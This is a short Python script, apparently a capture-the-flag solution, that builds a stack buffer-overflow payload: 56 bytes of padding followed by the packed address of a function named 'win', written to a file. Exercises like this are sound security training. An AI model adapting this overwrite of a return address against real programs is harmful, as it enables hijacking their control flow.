#!/usr/bin/env python3

from struct import pack

payload = b'a' * 56

# The address of the function win
payload += pack("<Q", 0x4021fd)

with open("payload", "wb") as f:
    f.write(payload)